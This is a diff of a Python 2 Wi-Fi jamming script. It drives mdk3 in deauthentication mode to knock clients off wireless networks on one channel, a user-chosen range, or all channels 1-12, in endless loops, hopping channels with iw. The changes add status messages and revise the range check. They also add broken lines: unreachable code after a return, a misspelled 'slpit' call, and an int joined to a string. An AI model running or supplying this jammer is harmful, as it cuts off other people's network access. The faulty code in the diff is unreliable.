@@ -40,12 +40,14 @@ def get_current_channel():
     for line in result.splitlines():
         if "channel" in line:
             return int(line.split()[1])
+            SearchedChannel = int(line.slpit()[1])
+            print "Current CH is : " + SearchedChannel + "\n"
     return None
 
 def set_channel(channel):
     current_channel = get_current_channel()
     if current_channel != channel:
-subprocess.call(["iw", "dev", adapter, "set", "channel", str(channel)])
+        subprocess.call(["iw", "dev", adapter, "set", "channel", str(channel)])
         time.sleep(2)
 
 def jam_specific_channel():
@@ -59,23 +61,25 @@ def jam_specific_channel():
 
 def jam_channel_range(first_channel, second_channel):
     while True:
-        if first_channel <= second_channel:
-            for channel in range(first_channel, second_channel + 1):
-                set_channel(channel)
-                process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
-                time.sleep(10)
-                process.terminate()
-                time.sleep(3)
-        else:
-            print "Second channel MUST BE GREATER than FIRST channel !"
-            exit()
+        for channel in range(first_channel, second_channel + 1):
+            print"Current CHan : " + str(channel) + "\n"
+            set_channel(channel)
+            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
+            time.sleep(10)
+            print "Terminating MDK3 process !\n"
+            time.sleep(1)
+            process.terminate()
+            time.sleep(3)
 
 def jam_all_channels():
     while True:
         for channel in range(1, 13):
             set_channel(channel)
+            print"Current CHan : " + str(channel) + "\n"
             process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
             time.sleep(10)
+            print "Terminating MDK3 process !\n"
+            time.sleep(1)
             process.terminate()
             time.sleep(3)
 
@@ -93,23 +97,19 @@ print "[2] - Jam ALL channels (Pick CH to Pick CH)"
 print "      Example : First CH 6, Second CH 9"
 print "[3] - Jam ALL channels (1 to 12)\n"
 
-
 # User input for selection
 pick_to_jam = raw_input("I will Pick --> ")
 
 if pick_to_jam == "1":
     jam_specific_channel()
-
 elif pick_to_jam == "2":
     first_channel = get_valid_channel("Type FIRST channel number (1-12) --> ")
     second_channel = get_valid_channel("Type SECOND channel number (1-12) --> ")
-
-    if first_channel > second_channel:
-        print "! WARNING !\nSecond Channel MUST BE GREATER than First Channel!"
-        print "For example:\nFirst Channel: 9\nSecond Channel: 3"
+    if first_channel >= second_channel:
+        print "! WARNING !\nFirst Channel MUST BE LESS than Second Channel!"
+        print "For example:\nFirst Channel: 3\nSecond Channel: 9"
     else:
         jam_channel_range(first_channel, second_channel)
-
 elif pick_to_jam == "3":
     jam_all_channels()
 else:
